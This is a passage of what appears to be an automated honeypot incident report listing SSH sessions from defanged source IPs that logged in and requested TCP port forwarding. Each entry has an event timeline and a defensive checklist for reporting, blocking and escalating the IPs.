### 🔴 HIGH · IR-86e55592af9f

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-08-24 10:10 |
| **Last Seen** | 2026-08-24 10:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:10:20` | `cowrie.session.connect` |
| `2026-08-24 10:10:20` | `cowrie.client.version` |
| `2026-08-24 10:10:20` | `cowrie.client.kex` |
| `2026-08-24 10:10:21` | `cowrie.login.success` |
| `2026-08-24 10:10:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-754abe24b4db

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:16 |
| **Last Seen** | 2026-08-24 10:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:16:09` | `cowrie.session.connect` |
| `2026-08-24 10:16:09` | `cowrie.client.version` |
| `2026-08-24 10:16:09` | `cowrie.client.kex` |
| `2026-08-24 10:16:11` | `cowrie.login.success` |
| `2026-08-24 10:16:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:16:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:16:11` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20106b225a78

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:16 |
| **Last Seen** | 2026-08-24 10:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:16:13` | `cowrie.session.connect` |
| `2026-08-24 10:16:13` | `cowrie.client.version` |
| `2026-08-24 10:16:13` | `cowrie.client.kex` |
| `2026-08-24 10:16:14` | `cowrie.login.success` |
| `2026-08-24 10:16:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:16:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:16:14` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f45d7f7c2e1c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 10:18 |
| **Last Seen** | 2026-08-24 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:18:56` | `cowrie.session.connect` |
| `2026-08-24 10:18:56` | `cowrie.client.version` |
| `2026-08-24 10:18:57` | `cowrie.client.kex` |
| `2026-08-24 10:18:57` | `cowrie.login.success` |
| `2026-08-24 10:18:57` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:18:57` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f9a2309642

| Field | Detail |
|---|---|
| **Source IP** | `85.225.13[.]121` |
| **First Seen** | 2026-08-24 10:20 |
| **Last Seen** | 2026-08-24 10:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:20:16` | `cowrie.session.connect` |
| `2026-08-24 10:20:17` | `cowrie.client.version` |
| `2026-08-24 10:20:17` | `cowrie.client.kex` |
| `2026-08-24 10:20:18` | `cowrie.login.success` |
| `2026-08-24 10:20:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.225.13[.]121` to AbuseIPDB if not already reported
- [ ] Block `85.225.13[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be7342bd0d9

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-08-24 10:20 |
| **Last Seen** | 2026-08-24 10:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:20:28` | `cowrie.session.connect` |
| `2026-08-24 10:20:28` | `cowrie.client.version` |
| `2026-08-24 10:20:28` | `cowrie.client.kex` |
| `2026-08-24 10:20:29` | `cowrie.login.success` |
| `2026-08-24 10:20:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a68dd50268

| Field | Detail |
|---|---|
| **Source IP** | `200.170.213[.]9` |
| **First Seen** | 2026-08-24 10:23 |
| **Last Seen** | 2026-08-24 10:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:23:56` | `cowrie.session.connect` |
| `2026-08-24 10:23:57` | `cowrie.client.version` |
| `2026-08-24 10:23:57` | `cowrie.client.kex` |
| `2026-08-24 10:23:59` | `cowrie.login.success` |
| `2026-08-24 10:23:59` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.170.213[.]9` to AbuseIPDB if not already reported
- [ ] Block `200.170.213[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620de4d952d8

| Field | Detail |
|---|---|
| **Source IP** | `200.170.213[.]9` |
| **First Seen** | 2026-08-24 10:24 |
| **Last Seen** | 2026-08-24 10:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:24:04` | `cowrie.session.connect` |
| `2026-08-24 10:24:05` | `cowrie.client.version` |
| `2026-08-24 10:24:05` | `cowrie.client.kex` |
| `2026-08-24 10:24:07` | `cowrie.login.success` |
| `2026-08-24 10:24:07` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.170.213[.]9` to AbuseIPDB if not already reported
- [ ] Block `200.170.213[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657d34c06f6d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:25 |
| **Last Seen** | 2026-08-24 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:25:37` | `cowrie.session.connect` |
| `2026-08-24 10:25:37` | `cowrie.client.version` |
| `2026-08-24 10:25:37` | `cowrie.client.kex` |
| `2026-08-24 10:25:38` | `cowrie.login.success` |
| `2026-08-24 10:25:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:25:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:25:38` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff508e3fc514

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:25 |
| **Last Seen** | 2026-08-24 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:25:41` | `cowrie.session.connect` |
| `2026-08-24 10:25:41` | `cowrie.client.version` |
| `2026-08-24 10:25:41` | `cowrie.client.kex` |
| `2026-08-24 10:25:42` | `cowrie.login.success` |
| `2026-08-24 10:25:42` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:25:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:25:42` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353d28f0c02b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:35 |
| **Last Seen** | 2026-08-24 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:35:03` | `cowrie.session.connect` |
| `2026-08-24 10:35:03` | `cowrie.client.version` |
| `2026-08-24 10:35:03` | `cowrie.client.kex` |
| `2026-08-24 10:35:04` | `cowrie.login.success` |
| `2026-08-24 10:35:04` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:35:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:35:05` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6962085768c6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:35 |
| **Last Seen** | 2026-08-24 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:35:08` | `cowrie.session.connect` |
| `2026-08-24 10:35:08` | `cowrie.client.version` |
| `2026-08-24 10:35:08` | `cowrie.client.kex` |
| `2026-08-24 10:35:09` | `cowrie.login.success` |
| `2026-08-24 10:35:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:35:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:35:09` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d505aa29751f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-08-24 10:39 |
| **Last Seen** | 2026-08-24 10:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:39:08` | `cowrie.session.connect` |
| `2026-08-24 10:39:08` | `cowrie.client.version` |
| `2026-08-24 10:39:08` | `cowrie.client.kex` |
| `2026-08-24 10:39:10` | `cowrie.login.success` |
| `2026-08-24 10:39:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5239a90a5607

| Field | Detail |
|---|---|
| **Source IP** | `211.53.58[.]10` |
| **First Seen** | 2026-08-24 10:39 |
| **Last Seen** | 2026-08-24 10:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:39:15` | `cowrie.session.connect` |
| `2026-08-24 10:39:16` | `cowrie.client.version` |
| `2026-08-24 10:39:16` | `cowrie.client.kex` |
| `2026-08-24 10:39:18` | `cowrie.login.success` |
| `2026-08-24 10:39:19` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.53.58[.]10` to AbuseIPDB if not already reported
- [ ] Block `211.53.58[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09817f1735de

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:44 |
| **Last Seen** | 2026-08-24 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:44:47` | `cowrie.session.connect` |
| `2026-08-24 10:44:47` | `cowrie.client.version` |
| `2026-08-24 10:44:48` | `cowrie.client.kex` |
| `2026-08-24 10:44:48` | `cowrie.login.success` |
| `2026-08-24 10:44:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:44:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:44:49` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d2cc32875a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:44 |
| **Last Seen** | 2026-08-24 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:44:51` | `cowrie.session.connect` |
| `2026-08-24 10:44:51` | `cowrie.client.version` |
| `2026-08-24 10:44:51` | `cowrie.client.kex` |
| `2026-08-24 10:44:52` | `cowrie.login.success` |
| `2026-08-24 10:44:52` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:44:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:44:53` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-446f2ddceed6

| Field | Detail |
|---|---|
| **Source IP** | `103.18.69[.]54` |
| **First Seen** | 2026-08-24 10:47 |
| **Last Seen** | 2026-08-24 10:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:47:32` | `cowrie.session.connect` |
| `2026-08-24 10:47:33` | `cowrie.client.version` |
| `2026-08-24 10:47:33` | `cowrie.client.kex` |
| `2026-08-24 10:47:35` | `cowrie.login.success` |
| `2026-08-24 10:47:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.18.69[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.18.69[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d9c63fd00e

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-08-24 10:47 |
| **Last Seen** | 2026-08-24 10:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:47:41` | `cowrie.session.connect` |
| `2026-08-24 10:47:41` | `cowrie.client.version` |
| `2026-08-24 10:47:41` | `cowrie.client.kex` |
| `2026-08-24 10:47:44` | `cowrie.login.success` |
| `2026-08-24 10:47:45` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178520c9e89b

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-08-24 10:52 |
| **Last Seen** | 2026-08-24 10:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:52:25` | `cowrie.session.connect` |
| `2026-08-24 10:52:26` | `cowrie.client.version` |
| `2026-08-24 10:52:26` | `cowrie.client.kex` |
| `2026-08-24 10:52:28` | `cowrie.login.success` |
| `2026-08-24 10:52:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33830ae3b29c

| Field | Detail |
|---|---|
| **Source IP** | `202.154.15[.]177` |
| **First Seen** | 2026-08-24 10:52 |
| **Last Seen** | 2026-08-24 10:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:52:34` | `cowrie.session.connect` |
| `2026-08-24 10:52:35` | `cowrie.client.version` |
| `2026-08-24 10:52:35` | `cowrie.client.kex` |
| `2026-08-24 10:52:38` | `cowrie.login.success` |
| `2026-08-24 10:52:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.154.15[.]177` to AbuseIPDB if not already reported
- [ ] Block `202.154.15[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92fd4a635753

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-08-24 10:52 |
| **Last Seen** | 2026-08-24 10:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:52:38` | `cowrie.session.connect` |
| `2026-08-24 10:52:39` | `cowrie.client.version` |
| `2026-08-24 10:52:39` | `cowrie.client.kex` |
| `2026-08-24 10:52:41` | `cowrie.login.success` |
| `2026-08-24 10:52:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c735e3a508de

| Field | Detail |
|---|---|
| **Source IP** | `69.124.69[.]20` |
| **First Seen** | 2026-08-24 10:52 |
| **Last Seen** | 2026-08-24 10:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:52:46` | `cowrie.session.connect` |
| `2026-08-24 10:52:47` | `cowrie.client.version` |
| `2026-08-24 10:52:47` | `cowrie.client.kex` |
| `2026-08-24 10:52:48` | `cowrie.login.success` |
| `2026-08-24 10:52:48` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.124.69[.]20` to AbuseIPDB if not already reported
- [ ] Block `69.124.69[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d880036ed68a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:54 |
| **Last Seen** | 2026-08-24 10:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:54:08` | `cowrie.session.connect` |
| `2026-08-24 10:54:08` | `cowrie.client.version` |
| `2026-08-24 10:54:08` | `cowrie.client.kex` |
| `2026-08-24 10:54:09` | `cowrie.login.success` |
| `2026-08-24 10:54:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:54:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:54:10` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2975b7872a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:54 |
| **Last Seen** | 2026-08-24 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:54:12` | `cowrie.session.connect` |
| `2026-08-24 10:54:12` | `cowrie.client.version` |
| `2026-08-24 10:54:13` | `cowrie.client.kex` |
| `2026-08-24 10:54:13` | `cowrie.login.success` |
| `2026-08-24 10:54:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:54:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:54:14` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3c7cf9d43d

| Field | Detail |
|---|---|
| **Source IP** | `46.210.94[.]61` |
| **First Seen** | 2026-08-24 10:56 |
| **Last Seen** | 2026-08-24 10:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
